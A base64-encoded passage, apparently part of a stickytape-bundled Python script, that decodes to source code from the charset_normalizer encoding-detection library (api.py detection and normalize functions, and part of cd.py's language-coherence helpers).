ICB0YXJnZXRfbGFuZ3VhZ2VzID0gbWJfZW5jb2RpbmdfbGFuZ3VhZ2VzKGVuY29kaW5nX2lhbmEpXG5cbiAgICAgICAgaWYgdGFyZ2V0X2xhbmd1YWdlczpcbiAgICAgICAgICAgIGxvZ2dlci5sb2coXG4gICAgICAgICAgICAgICAgVFJBQ0UsXG4gICAgICAgICAgICAgICAgInt9IHNob3VsZCB0YXJnZXQgYW55IGxhbmd1YWdlKHMpIG9mIHt9Ii5mb3JtYXQoXG4gICAgICAgICAgICAgICAgICAgIGVuY29kaW5nX2lhbmEsIHN0cih0YXJnZXRfbGFuZ3VhZ2VzKVxuICAgICAgICAgICAgICAgICksXG4gICAgICAgICAgICApXG5cbiAgICAgICAgY2RfcmF0aW9zID0gW11cblxuICAgICAgICAjIFdlIHNoYWxsIHNraXAgdGhlIENEIHdoZW4gaXRzIGFib3V0IEFTQ0lJXG4gICAgICAgICMgTW9zdCBvZiB0aGUgdGltZSBpdHMgbm90IHJlbGV2YW50IHRvIHJ1biAibGFuZ3VhZ2UtZGV0ZWN0aW9uIiBvbiBpdC5cbiAgICAgICAgaWYgZW5jb2RpbmdfaWFuYSAhPSAiYXNjaWkiOlxuICAgICAgICAgICAgZm9yIGNodW5rIGluIG1kX2NodW5rczpcbiAgICAgICAgICAgICAgICBjaHVua19sYW5ndWFnZXMgPSBjb2hlcmVuY2VfcmF0aW8oXG4gICAgICAgICAgICAgICAgICAgIGNodW5rLCAwLjEsICIsIi5qb2luKHRhcmdldF9sYW5ndWFnZXMpIGlmIHRhcmdldF9sYW5ndWFnZXMgZWxzZSBOb25lXG4gICAgICAgICAgICAgICAgKVxuXG4gICAgICAgICAgICAgICAgY2RfcmF0aW9zLmFwcGVuZChjaHVua19sYW5ndWFnZXMpXG5cbiAgICAgICAgY2RfcmF0aW9zX21lcmdlZCA9IG1lcmdlX2NvaGVyZW5jZV9yYXRpb3MoY2RfcmF0aW9zKVxuXG4gICAgICAgIGlmIGNkX3JhdGlvc19tZXJnZWQ6XG4gICAgICAgICAgICBsb2dnZXIubG9nKFxuICAgICAgICAgICAgICAgIFRSQUNFLFxuICAgICAgICAgICAgICAgICJXZSBkZXRlY3RlZCBsYW5ndWFnZSB7fSB1c2luZyB7fSIuZm9ybWF0KFxuICAgICAgICAgICAgICAgICAgICBjZF9yYXRpb3NfbWVyZ2VkLCBlbmNvZGluZ19pYW5hXG4gICAgICAgICAgICAgICAgKSxcbiAgICAgICAgICAgIClcblxuICAgICAgICByZXN1bHRzLmFwcGVuZChcbiAgICAgICAgICAgIENoYXJzZXRNYXRjaChcbiAgICAgICAgICAgICAgICBzZXF1ZW5jZXMsXG4gICAgICAgICAgICAgICAgZW5jb2RpbmdfaWFuYSxcbiAgICAgICAgICAgICAgICBtZWFuX21lc3NfcmF0aW8sXG4gICAgICAgICAgICAgICAgYm9tX29yX3NpZ19hdmFpbGFibGUsXG4gICAgICAgICAgICAgICAgY2RfcmF0aW9zX21lcmdlZCxcbiAgICAgICAgICAgICAgICBkZWNvZGVkX3BheWxvYWQsXG4gICAgICAgICAgICApXG4gICAgICAgIClcblxuICAgICAgICBpZiAoXG4gICAgICAgICAgICBlbmNvZGluZ19pYW5hIGluIFtzcGVjaWZpZWRfZW5jb2RpbmcsICJhc2NpaSIsICJ1dGZfOCJdXG4gICAgICAgICAgICBhbmQgbWVhbl9tZXNzX3JhdGlvIDwgMC4xXG4gICAgICAgICk6XG4gICAgICAgICAgICBsb2dnZXIuZGVidWcoXG4gICAgICAgICAgICAgICAgIkVuY29kaW5nIGRldGVjdGlvbjogJXMgaXMgbW9zdCBsaWtlbHkgdGhlIG9uZS4iLCBlbmNvZGluZ19pYW5hXG4gICAgICAgICAgICApXG4gICAgICAgICAgICBpZiBleHBsYWluOlxuICAgICAgICAgICAgICAgIGxvZ2dlci5yZW1vdmVIYW5kbGVyKGV4cGxhaW5faGFuZGxlcilcbiAgICAgICAgICAgICAgICBsb2dnZXIuc2V0TGV2ZWwocHJldmlvdXNfbG9nZ2VyX2xldmVsKVxuICAgICAgICAgICAgcmV0dXJuIENoYXJzZXRNYXRjaGVzKFtyZXN1bHRzW2VuY29kaW5nX2lhbmFdXSlcblxuICAgICAgICBpZiBlbmNvZGluZ19pYW5hID09IHNpZ19lbmNvZGluZzpcbiAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZyhcbiAgICAgICAgICAgICAgICAiRW5jb2RpbmcgZGV0ZWN0aW9uOiAlcyBpcyBtb3N0IGxpa2VseSB0aGUgb25lIGFzIHdlIGRldGVjdGVkIGEgQk9NIG9yIFNJRyB3aXRoaW4gIlxuICAgICAgICAgICAgICAgICJ0aGUgYmVnaW5uaW5nIG9mIHRoZSBzZXF1ZW5jZS4iLFxuICAgICAgICAgICAgICAgIGVuY29kaW5nX2lhbmEsXG4gICAgICAgICAgICApXG4gICAgICAgICAgICBpZiBleHBsYWluOlxuICAgICAgICAgICAgICAgIGxvZ2dlci5yZW1vdmVIYW5kbGVyKGV4cGxhaW5faGFuZGxlcilcbiAgICAgICAgICAgICAgICBsb2dnZXIuc2V0TGV2ZWwocHJldmlvdXNfbG9nZ2VyX2xldmVsKVxuICAgICAgICAgICAgcmV0dXJuIENoYXJzZXRNYXRjaGVzKFtyZXN1bHRzW2VuY29kaW5nX2lhbmFdXSlcblxuICAgIGlmIGxlbihyZXN1bHRzKSA9PSAwOlxuICAgICAgICBpZiBmYWxsYmFja191OCBvciBmYWxsYmFja19hc2NpaSBvciBmYWxsYmFja19zcGVjaWZpZWQ6XG4gICAgICAgICAgICBsb2dnZXIubG9nKFxuICAgICAgICAgICAgICAgIFRSQUNFLFxuICAgICAgICAgICAgICAgICJOb3RoaW5nIGdvdCBvdXQgb2YgdGhlIGRldGVjdGlvbiBwcm9jZXNzLiBVc2luZyBBU0NJSS9VVEYtOC9TcGVjaWZpZWQgZmFsbGJhY2suIixcbiAgICAgICAgICAgIClcblxuICAgICAgICBpZiBmYWxsYmFja19zcGVjaWZpZWQ6XG4gICAgICAgICAgICBsb2dnZXIuZGVidWcoXG4gICAgICAgICAgICAgICAgIkVuY29kaW5nIGRldGVjdGlvbjogJXMgd2lsbCBiZSB1c2VkIGFzIGEgZmFsbGJhY2sgbWF0Y2giLFxuICAgICAgICAgICAgICAgIGZhbGxiYWNrX3NwZWNpZmllZC5lbmNvZGluZyxcbiAgICAgICAgICAgIClcbiAgICAgICAgICAgIHJlc3VsdHMuYXBwZW5kKGZhbGxiYWNrX3NwZWNpZmllZClcbiAgICAgICAgZWxpZiAoXG4gICAgICAgICAgICAoZmFsbGJhY2tfdTggYW5kIGZhbGxiYWNrX2FzY2lpIGlzIE5vbmUpXG4gICAgICAgICAgICBvciAoXG4gICAgICAgICAgICAgICAgZmFsbGJhY2tfdThcbiAgICAgICAgICAgICAgICBhbmQgZmFsbGJhY2tfYXNjaWlcbiAgICAgICAgICAgICAgICBhbmQgZmFsbGJhY2tfdTguZmluZ2VycHJpbnQgIT0gZmFsbGJhY2tfYXNjaWkuZmluZ2VycHJpbnRcbiAgICAgICAgICAgIClcbiAgICAgICAgICAgIG9yIChmYWxsYmFja191OCBpcyBub3QgTm9uZSlcbiAgICAgICAgKTpcbiAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiRW5jb2RpbmcgZGV0ZWN0aW9uOiB1dGZfOCB3aWxsIGJlIHVzZWQgYXMgYSBmYWxsYmFjayBtYXRjaCIpXG4gICAgICAgICAgICByZXN1bHRzLmFwcGVuZChmYWxsYmFja191OClcbiAgICAgICAgZWxpZiBmYWxsYmFja19hc2NpaTpcbiAgICAgICAgICAgIGxvZ2dlci5kZWJ1ZygiRW5jb2RpbmcgZGV0ZWN0aW9uOiBhc2NpaSB3aWxsIGJlIHVzZWQgYXMgYSBmYWxsYmFjayBtYXRjaCIpXG4gICAgICAgICAgICByZXN1bHRzLmFwcGVuZChmYWxsYmFja19hc2NpaSlcblxuICAgIGlmIHJlc3VsdHM6XG4gICAgICAgIGxvZ2dlci5kZWJ1ZyhcbiAgICAgICAgICAgICJFbmNvZGluZyBkZXRlY3Rpb246IEZvdW5kICVzIGFzIHBsYXVzaWJsZSAoYmVzdC1jYW5kaWRhdGUpIGZvciBjb250ZW50LiBXaXRoICVpIGFsdGVybmF0aXZlcy4iLFxuICAgICAgICAgICAgcmVzdWx0cy5iZXN0KCkuZW5jb2RpbmcsICAjIHR5cGU6IGlnbm9yZVxuICAgICAgICAgICAgbGVuKHJlc3VsdHMpIC0gMSxcbiAgICAgICAgKVxuICAgIGVsc2U6XG4gICAgICAgIGxvZ2dlci5kZWJ1ZygiRW5jb2RpbmcgZGV0ZWN0aW9uOiBVbmFibGUgdG8gZGV0ZXJtaW5lIGFueSBzdWl0YWJsZSBjaGFyc2V0LiIpXG5cbiAgICBpZiBleHBsYWluOlxuICAgICAgICBsb2dnZXIucmVtb3ZlSGFuZGxlcihleHBsYWluX2hhbmRsZXIpXG4gICAgICAgIGxvZ2dlci5zZXRMZXZlbChwcmV2aW91c19sb2dnZXJfbGV2ZWwpXG5cbiAgICByZXR1cm4gcmVzdWx0c1xuXG5cbmRlZiBmcm9tX2ZwKFxuICAgIGZwOiBCaW5hcnlJTyxcbiAgICBzdGVwczogaW50ID0gNSxcbiAgICBjaHVua19zaXplOiBpbnQgPSA1MTIsXG4gICAgdGhyZXNob2xkOiBmbG9hdCA9IDAuMjAsXG4gICAgY3BfaXNvbGF0aW9uOiBMaXN0W3N0cl0gPSBOb25lLFxuICAgIGNwX2V4Y2x1c2lvbjogTGlzdFtzdHJdID0gTm9uZSxcbiAgICBwcmVlbXB0aXZlX2JlaGF2aW91cjogYm9vbCA9IFRydWUsXG4gICAgZXhwbGFpbjogYm9vbCA9IEZhbHNlLFxuKSAtPiBDaGFyc2V0TWF0Y2hlczpcbiAgICAiIiJcbiAgICBTYW1lIHRoaW5nIHRoYW4gdGhlIGZ1bmN0aW9uIGZyb21fYnl0ZXMgYnV0IHVzaW5nIGEgZmlsZSBwb2ludGVyIHRoYXQgaXMgYWxyZWFkeSByZWFkeS5cbiAgICBXaWxsIG5vdCBjbG9zZSB0aGUgZmlsZSBwb2ludGVyLlxuICAgICIiIlxuICAgIHJldHVybiBmcm9tX2J5dGVzKFxuICAgICAgICBmcC5yZWFkKCksXG4gICAgICAgIHN0ZXBzLFxuICAgICAgICBjaHVua19zaXplLFxuICAgICAgICB0aHJlc2hvbGQsXG4gICAgICAgIGNwX2lzb2xhdGlvbixcbiAgICAgICAgY3BfZXhjbHVzaW9uLFxuICAgICAgICBwcmVlbXB0aXZlX2JlaGF2aW91cixcbiAgICAgICAgZXhwbGFpbixcbiAgICApXG5cblxuZGVmIGZyb21fcGF0aChcbiAgICBwYXRoOiBQYXRoTGlrZSxcbiAgICBzdGVwczogaW50ID0gNSxcbiAgICBjaHVua19zaXplOiBpbnQgPSA1MTIsXG4gICAgdGhyZXNob2xkOiBmbG9hdCA9IDAuMjAsXG4gICAgY3BfaXNvbGF0aW9uOiBMaXN0W3N0cl0gPSBOb25lLFxuICAgIGNwX2V4Y2x1c2lvbjogTGlzdFtzdHJdID0gTm9uZSxcbiAgICBwcmVlbXB0aXZlX2JlaGF2aW91cjogYm9vbCA9IFRydWUsXG4gICAgZXhwbGFpbjogYm9vbCA9IEZhbHNlLFxuKSAtPiBDaGFyc2V0TWF0Y2hlczpcbiAgICAiIiJcbiAgICBTYW1lIHRoaW5nIHRoYW4gdGhlIGZ1bmN0aW9uIGZyb21fYnl0ZXMgYnV0IHdpdGggb25lIGV4dHJhIHN0ZXAuIE9wZW5pbmcgYW5kIHJlYWRpbmcgZ2l2ZW4gZmlsZSBwYXRoIGluIGJpbmFyeSBtb2RlLlxuICAgIENhbiByYWlzZSBJT0Vycm9yLlxuICAgICIiIlxuICAgIHdpdGggb3BlbihwYXRoLCAicmIiKSBhcyBmcDpcbiAgICAgICAgcmV0dXJuIGZyb21fZnAoXG4gICAgICAgICAgICBmcCxcbiAgICAgICAgICAgIHN0ZXBzLFxuICAgICAgICAgICAgY2h1bmtfc2l6ZSxcbiAgICAgICAgICAgIHRocmVzaG9sZCxcbiAgICAgICAgICAgIGNwX2lzb2xhdGlvbixcbiAgICAgICAgICAgIGNwX2V4Y2x1c2lvbixcbiAgICAgICAgICAgIHByZWVtcHRpdmVfYmVoYXZpb3VyLFxuICAgICAgICAgICAgZXhwbGFpbixcbiAgICAgICAgKVxuXG5cbmRlZiBub3JtYWxpemUoXG4gICAgcGF0aDogUGF0aExpa2UsXG4gICAgc3RlcHM6IGludCA9IDUsXG4gICAgY2h1bmtfc2l6ZTogaW50ID0gNTEyLFxuICAgIHRocmVzaG9sZDogZmxvYXQgPSAwLjIwLFxuICAgIGNwX2lzb2xhdGlvbjogTGlzdFtzdHJdID0gTm9uZSxcbiAgICBjcF9leGNsdXNpb246IExpc3Rbc3RyXSA9IE5vbmUsXG4gICAgcHJlZW1wdGl2ZV9iZWhhdmlvdXI6IGJvb2wgPSBUcnVlLFxuKSAtPiBDaGFyc2V0TWF0Y2g6XG4gICAgIiIiXG4gICAgVGFrZSBhICh0ZXh0LWJhc2VkKSBmaWxlIHBhdGggYW5kIHRyeSB0byBjcmVhdGUgYW5vdGhlciBmaWxlIG5leHQgdG8gaXQsIHRoaXMgdGltZSB1c2luZyBVVEYtOC5cbiAgICAiIiJcbiAgICByZXN1bHRzID0gZnJvbV9wYXRoKFxuICAgICAgICBwYXRoLFxuICAgICAgICBzdGVwcyxcbiAgICAgICAgY2h1bmtfc2l6ZSxcbiAgICAgICAgdGhyZXNob2xkLFxuICAgICAgICBjcF9pc29sYXRpb24sXG4gICAgICAgIGNwX2V4Y2x1c2lvbixcbiAgICAgICAgcHJlZW1wdGl2ZV9iZWhhdmlvdXIsXG4gICAgKVxuXG4gICAgZmlsZW5hbWUgPSBiYXNlbmFtZShwYXRoKVxuICAgIHRhcmdldF9leHRlbnNpb25zID0gbGlzdChzcGxpdGV4dChmaWxlbmFtZSkpXG5cbiAgICBpZiBsZW4ocmVzdWx0cykgPT0gMDpcbiAgICAgICAgcmFpc2UgSU9FcnJvcihcbiAgICAgICAgICAgIFwnVW5hYmxlIHRvIG5vcm1hbGl6ZSAie30iLCBubyBlbmNvZGluZyBjaGFyc2V0IHNlZW1zIHRvIGZpdC5cJy5mb3JtYXQoXG4gICAgICAgICAgICAgICAgZmlsZW5hbWVcbiAgICAgICAgICAgIClcbiAgICAgICAgKVxuXG4gICAgcmVzdWx0ID0gcmVzdWx0cy5iZXN0KClcblxuICAgIHRhcmdldF9leHRlbnNpb25zWzBdICs9ICItIiArIHJlc3VsdC5lbmNvZGluZyAgIyB0eXBlOiBpZ25vcmVcblxuICAgIHdpdGggb3BlbihcbiAgICAgICAgInt9Ii5mb3JtYXQoc3RyKHBhdGgpLnJlcGxhY2UoZmlsZW5hbWUsICIiLmpvaW4odGFyZ2V0X2V4dGVuc2lvbnMpKSksICJ3YiJcbiAgICApIGFzIGZwOlxuICAgICAgICBmcC53cml0ZShyZXN1bHQub3V0cHV0KCkpICAjIHR5cGU6IGlnbm9yZVxuXG4gICAgcmV0dXJuIHJlc3VsdCAgIyB0eXBlOiBpZ25vcmVcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjaGFyc2V0X25vcm1hbGl6ZXIvY2QucHknLCBiJ2ltcG9ydCBpbXBvcnRsaWJcbmZyb20gY29kZWNzIGltcG9ydCBJbmNyZW1lbnRhbERlY29kZXJcbmZyb20gY29sbGVjdGlvbnMgaW1wb3J0IENvdW50ZXIsIE9yZGVyZWREaWN0XG5mcm9tIGZ1bmN0b29scyBpbXBvcnQgbHJ1X2NhY2hlXG5mcm9tIHR5cGluZyBpbXBvcnQgRGljdCwgTGlzdCwgT3B0aW9uYWwsIFR1cGxlXG5cbmZyb20gLmFzc2V0cyBpbXBvcnQgRlJFUVVFTkNJRVNcbmZyb20gLmNvbnN0YW50IGltcG9ydCBLT19OQU1FUywgTEFOR1VBR0VfU1VQUE9SVEVEX0NPVU5ULCBUT09fU01BTExfU0VRVUVOQ0UsIFpIX05BTUVTXG5mcm9tIC5tZCBpbXBvcnQgaXNfc3VzcGljaW91c2x5X3N1Y2Nlc3NpdmVfcmFuZ2VcbmZyb20gLm1vZGVscyBpbXBvcnQgQ29oZXJlbmNlTWF0Y2hlc1xuZnJvbSAudXRpbHMgaW1wb3J0IChcbiAgICBpc19hY2NlbnR1YXRlZCxcbiAgICBpc19sYXRpbixcbiAgICBpc19tdWx0aV9ieXRlX2VuY29kaW5nLFxuICAgIGlzX3VuaWNvZGVfcmFuZ2Vfc2Vjb25kYXJ5LFxuICAgIHVuaWNvZGVfcmFuZ2UsXG4pXG5cblxuZGVmIGVuY29kaW5nX3VuaWNvZGVfcmFuZ2UoaWFuYV9uYW1lOiBzdHIpIC0+IExpc3Rbc3RyXTpcbiAgICAiIiJcbiAgICBSZXR1cm4gYXNzb2NpYXRlZCB1bmljb2RlIHJhbmdlcyBpbiBhIHNpbmdsZSBieXRlIGNvZGUgcGFnZS5cbiAgICAiIiJcbiAgICBpZiBpc19tdWx0aV9ieXRlX2VuY29kaW5nKGlhbmFfbmFtZSk6XG4gICAgICAgIHJhaXNlIElPRXJyb3IoIkZ1bmN0aW9uIG5vdCBzdXBwb3J0ZWQgb24gbXVsdGktYnl0ZSBjb2RlIHBhZ2UiKVxuXG4gICAgZGVjb2RlciA9IGltcG9ydGxpYi5pbXBvcnRfbW9kdWxlKCJlbmNvZGluZ3Mue30iLmZvcm1hdChpYW5hX25hbWUpKS5JbmNyZW1lbnRhbERlY29kZXIgICMgdHlwZTogaWdub3JlXG5cbiAgICBwID0gZGVjb2RlcihlcnJvcnM9Imlnbm9yZSIpICAjIHR5cGU6IEluY3JlbWVudGFsRGVjb2RlclxuICAgIHNlZW5fcmFuZ2VzID0ge30gICMgdHlwZTogRGljdFtzdHIsIGludF1cbiAgICBjaGFyYWN0ZXJfY291bnQgPSAwICAjIHR5cGU6IGludFxuXG4gICAgZm9yIGkgaW4gcmFuZ2UoMHg0MCwgMHhGRik6XG4gICAgICAgIGNodW5rID0gcC5kZWNvZGUoYnl0ZXMoW2ldKSkgICMgdHlwZTogc3RyXG5cbiAgICAgICAgaWYgY2h1bms6XG4gICAgICAgICAgICBjaGFyYWN0ZXJfcmFuZ2UgPSB1bmljb2RlX3JhbmdlKGNodW5rKSAgIyB0eXBlOiBPcHRpb25hbFtzdHJdXG5cbiAgICAgICAgICAgIGlmIGNoYXJhY3Rlcl9yYW5nZSBpcyBOb25lOlxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXG5cbiAgICAgICAgICAgIGlmIGlzX3VuaWNvZGVfcmFuZ2Vfc2Vjb25kYXJ5KGNoYXJhY3Rlcl9yYW5nZSkgaXMgRmFsc2U6XG4gICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyX3JhbmdlIG5vdCBpbiBzZWVuX3JhbmdlczpcbiAgICAgICAgICAgICAgICAgICAgc2Vlbl9yYW5nZXNbY2hhcmFjdGVyX3JhbmdlXSA9IDBcbiAgICAgICAgICAgICAgICBzZWVuX3Jhbmdlc1tjaGFyYWN0ZXJfcmFuZ2VdICs9IDFcbiAgICAgICAgICAgICAgICBjaGFyYWN0ZXJfY291bnQgKz0gMVxuXG4gICAgcmV0dXJuIHNvcnRlZChcbiAgICAgICAgW1xuICAgICAgICAgICAgY2hhcmFjdGVyX3JhbmdlXG4gICAgICAgICAgICBmb3IgY2hhcmFjdGVyX3JhbmdlIGluIHNlZW5fcmFuZ2VzXG4gICAgICAgICAgICBpZiBzZWVuX3Jhbmdlc1tjaGFyYWN0ZXJfcmFuZ2VdIC8gY2hhcmFjdGVyX2NvdW50ID49IDAuMTVcbiAgICAgICAgXVxuICAgIClcblxuXG5kZWYgdW5pY29kZV9yYW5nZV9sYW5ndWFnZXMocHJpbWFyeV9yYW5nZTogc3RyKSAtPiBMaXN0W3N0cl06XG4gICAgIiIiXG4gICAgUmV0dXJuIGluZmVycmVkIGxhbmd1YWdlcyB1c2VkIHdpdGggYSB1bmljb2RlIHJhbmdlLlxuICAgICIiIlxuICAgIGxhbmd1YWdlcyA9IFtdICAjIHR5cGU6IExpc3Rbc3RyXVxuXG4gICAgZm9yIGxhbmd1YWdlLCBjaGFyYWN0ZXJzIGluIEZSRVFVRU5DSUVTLml0ZW1zKCk6XG4gICAgICAgIGZvciBjaGFyYWN0ZXIgaW4gY2hhcmFjdGVyczpcbiAgICAgICAgICAgIGlmIHVuaWNvZGVfcmFuZ2UoY2hhcmFjdGVyKSA9PSBwcmltYXJ5X3JhbmdlOlxuICAgICAgICAgICAgICAgIGxhbmd1YWdlcy5hcHBlbmQobGFuZ3VhZ2UpXG4gICAgICAgICAgICAgICAgYnJlYWtcblxuICAgIHJldHVybiBsYW5ndWFnZXNcblxuXG5AbHJ1X2NhY2hlKClcbmRlZiBlbmNvZGluZ19sYW5ndWFnZXMoaWFuYV9uYW1lOiBzdHIpIC0+IExpc3Rbc3RyXTpcbiAgICAiIiJcbiAgICBTaW5nbGUtYnl0ZSBlbmNvZGluZyBsYW5ndWFnZSBhc3NvY2lhdGlvbi4gU29tZSBjb2RlIHBhZ2UgYXJlIGhlYXZpbHkgbGlua2VkIHRvIHBhcnRpY3VsYXIgbGFuZ3VhZ2UocykuXG4gICAgVGhpcyBmdW5jdGlvbiBkb2VzIHRoZSBjb3JyZXNwb25kZW5jZS5cbiAgICAiIiJcbiAgICB1bmljb2RlX3JhbmdlcyA9IGVuY29kaW5nX3VuaWNvZGVfcmFuZ2UoaWFuYV9uYW1lKSAgIyB0eXBlOiBMaXN0W3N0cl1cbiAgICBwcmltYXJ5X3JhbmdlID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtzdHJdXG5cbiAgICBmb3Igc3BlY2lmaWVkX3JhbmdlIGluIHVuaWNvZGVfcmFuZ2VzOlxuICAgICAgICBpZiAiTGF0aW4iIG5vdCBpbiBzcGVjaWZpZWRfcmFuZ2U6XG4gICAgICAgICAgICBwcmltYXJ5X3JhbmdlID0gc3BlY2lmaWVkX3JhbmdlXG4gICAgICAgICAgICBicmVha1xuXG4gICAgaWYgcHJpbWFyeV9yYW5nZSBpcyBOb25lOlxuICAgICAgICByZXR1cm4gWyJMYXRpbiBCYXNlZCJdXG5cbiAgICByZXR1cm4gdW5pY29kZV9yYW5nZV9sYW5ndWFnZXMocHJpbWFyeV9yYW5nZSlcblxuXG5AbHJ1X2NhY2hlKClcbmRlZiBtYl9lbmNvZGluZ19sYW5ndWFnZXMoaWFuYV9uYW1lOiBzdHIpIC0+IExpc3Rbc3RyXTpcbiAgICAiIiJcbiAgICBNdWx0aS1ieXRlIGVuY29kaW5nIGxhbmd1YWdlIGFzc29jaWF0aW9uLiBTb21lIGNvZGUgcGFnZSBhcmUgaGVhdmlseSBsaW5rZWQgdG8gcGFydGljdWxhciBsYW5ndWFnZShzKS5cbiAgICBUaGlzIGZ1bmN0aW9uIGRvZXMgdGhlIGNvcnJlc3BvbmRlbmNlLlxuICAgICIiIlxuICAgIGlmIChcbiAgICAgICAgaWFuYV9uYW1lLnN0YXJ0c3dpdGgoInNoaWZ0XyIpXG4gICAgICAgIG9yIGlhbmFfbmFtZS5zdGFydHN3aXRoKCJpc28yMDIyX2pwIilcbiAgICAgICAgb3IgaWFuYV9uYW1lLnN0YXJ0c3dpdGgoImV1Y19qIilcbiAgICAgICAgb3IgaWFuYV9uYW1lID09ICJjcDkzMiJcbiAgICApOlxuICAgICAgICByZXR1cm4gWyJKYXBhbmVzZSJdXG4gICAgaWYgaWFuYV9uYW1lLnN0YXJ0c3dpdGgoImdiIikgb3IgaWFuYV9uYW1lIGluIFpIX05BTUVTOlxuICAgICAgICByZXR1cm4gWyJDaGluZXNlIiwgIkNsYXNzaWNhbCBDaGluZXNlIl1cbiAgICBpZiBpYW5hX25hbWUuc3RhcnRzd2l0aCgiaXNvMjAyMl9rciIpIG9yIGlhbmFfbmFtZSBpbiBLT19OQU1FUzpcbiAgICAgICAgcmV0dXJuIFsiS29yZWFuIl1cblxuICAgIHJldHVybiBbXVxuXG5cbkBscnVfY2FjaGUobWF4c2l6ZT1MQU5HVUFHRV9TVVBQT1JURURfQ09VTlQpXG5kZWYgZ2V0X3RhcmdldF9mZWF0dXJlcyhsYW5ndWFnZTogc3RyKSAtPiBUdXBsZVtib29sLCBib29sXTpcbiAgICAiIiJcbiAgICBEZXRlcm1pbmUgbWFpbiBhc3BlY3RzIGZyb20gYSBzdXBwb3J0ZWQgbGFuZ3VhZ2UgaWYgaXQgY29udGFpbnMgYWNjZW50cyBhbmQgaWYgaXMgcHVyZSBMYXRpbi5cbiAgICAiIiJcbiAgICB0YXJnZXRfaGF2ZV9hY2NlbnRzID0gRmFsc2UgICMgdHlwZTogYm9vbFxuICAgIHRhcmdldF9wdXJlX2xhdGluID0gVHJ1ZSAgIyB0eXBlOiBib29sXG5cbiAgICBmb3IgY2hhcmFjdGVyIGluIEZSRVFVRU5DSUVTW2xhbmd1YWdlXTpcbiAgICAgICAgaWYgbm90IHRhcmdldF9oYXZlX2FjY2VudHMgYW5kIGlzX2FjY2VudHVhdGVkKGNoYXJhY3Rlcik6XG4gICAgICAgICAgICB0YXJnZXRfaGF2ZV9hY2NlbnRzID0gVHJ1ZVxuICAgICAgICBpZiB0YXJnZXRfcHVyZV9sYXRpbiBhbmQgaXNfbGF0aW4oY2hhcmFjdGVyKSBpcyBGYWxzZTpcbiAgICAgICAgICAgIHRhcmdldF9wdXJlX2xhdGluID0gRmFsc2VcblxuICAgIHJldHVybiB0YXJnZXRfaGF2ZV9hY2NlbnRzLCB0YXJnZXRfcHVyZV9sYXRpblxuXG5cbmRlZiBhbHBoYWJldF9sYW5ndWFnZXMoXG4gICAgY2hhcmFjdGVyczogTGlzdFtzdHJdLCBpZ25vcmVfbm9uX2xhdGluOiBib29sID0gRmFsc2VcbikgLT4gTGlzdFtzdHJdOlxuICAgICIiIlxuICAgIFJldHVybiBhc3NvY2lhdGVkIGxhbmd1YWdlcyBhc3NvY2lhdGVkIHRvIGdpdmVuIGNoYXJhY3RlcnMuXG4gICAgIiIiXG4gICAgbGFuZ3VhZ2VzID0gW10gICMgdHlwZTogTGlzdFtUdXBsZVtzdHIsIGZsb2F0XV1cblxuICAgIHNvdXJjZV9oYXZlX2FjY2VudHMgPSBhbnkoaXNfYWNjZW50dWF0ZWQoY2hhcmFjdGVyKSBmb3IgY2hhcmFjdGVyIGluIGNoYXJhY3RlcnMpXG5cbiAgICBmb3IgbGFuZ3VhZ2UsIGxhbmd1YWdlX2NoYXJhY3RlcnMgaW4gRlJFUVVFTkNJRVMuaXRlbXMoKTpcblxuICAgICAgICB0YXJnZXRfaGF2ZV9hY2NlbnRzLCB0YXJnZXRfcHVyZV9sYXRpbiA9IGdldF90YXJnZXRfZmVhdHVyZXMobGFuZ3VhZ2UpXG5cbiAgICAgICAgaWYgaWdub3JlX25vbl9sYXRpbiBhbmQgdGFyZ2V0X3B1cmVfbGF0aW4gaXMgRmFsc2U6XG4gICAgICAgICAgICBjb250aW51ZVxuXG4gICAgICAgIGlmIHRhcmdldF9oYXZlX2FjY2VudHMgaXMgRmFsc2UgYW5kIHNvdXJjZV9oYXZlX2FjY2VudHM6XG4gICAgICAgICAgICBjb250aW51ZVxuXG4gICAgICAgIGNoYXJhY3Rlcl9jb3VudCA9IGxlbihsYW5ndWFnZV9jaGFyYWN0ZXJzKSAgIyB0eXBlOiBpbnRcblxuICAgICAgICBjaGFyYWN0ZXJfbWF0Y2hfY291bnQgPSBsZW4oXG4gICAgICAgICAgICBbYyBmb3IgYyBpbiBsYW5ndWFnZV9jaGFyYWN0ZXJzIGlmIGMgaW4gY2hhcmFjdGVyc11cbiAgICAgICAgKSAgIyB0eXBlOiBpbnRcblxuICAgICAgICByYXRpbyA9IGNoYXJhY3Rlcl9tYXRjaF9jb3VudCAvIGNoYXJhY3Rlcl9jb3VudCAgIyB0eXBlOiBmbG9hdFxuXG4gICAgICAgIGlmIHJhdGlvID49IDAuMjpcbiAgICAgICAgICAgIGxhbmd1YWdlcy5hcHBlbmQoKGxhbmd1YWdlLCByYXRpbykpXG5cbiAgICBsYW5ndWFnZXMgPSBzb3J0ZWQobGFuZ3VhZ2VzLCBrZXk9bGFtYmRhIHg6IHhbMV0sIHJldmVyc2U9VHJ1ZSlcblxuICAgIHJldHVybiBbY29tcGF0aWJsZV9sYW5ndWFnZVswXSBmb3IgY29tcGF0aWJsZV9sYW5ndWFnZSBpbiBsYW5ndWFnZXNdXG5cblxuZGVmIGNoYXJhY3RlcnNfcG9wdWxhcml0eV9jb21wYXJlKFxuICAgIGxhbmd1YWdlOiBzdHIsIG9yZGVyZWRfY2hhcmFjdGVyczogTGlzdFtzdHJdXG4pIC0+IGZsb2F0OlxuICAgICIiIlxuICAgIERldGVybWluZSBpZiBhIG9yZGVyZWQgY2hhcmFjdGVycyBsaXN0IChieSBvY2N1cnJlbmNlIGZyb20gbW9zdCBhcHBlYXJhbmNlIHRvIHJhcmVzdCkgbWF0Y2ggYSBwYXJ0aWN1bGFyIGxhbmd1YWdlLlxuICAgIFRoZSByZXN1bHQgaXMgYSByYXRpbyBiZXR3ZWVuIDAuIChhYnNvbHV0ZWx5IG5vIGNvcnJlc3BvbmRlbmNlKSBhbmQgMS4gKG5lYXIgcGVyZmVjdCBmaXQpLlxuICAgIEJld2FyZSB0aGF0IGlzIGZ1bmN0aW9uIGlzIG5vdCBzdHJpY3Qgb24gdGhlIG1hdGNoIGluIG9yZGVyIHRvIGVhc2UgdGhlIGRldGVjdGlvbi4gKE1lYW5pbmcgY2xvc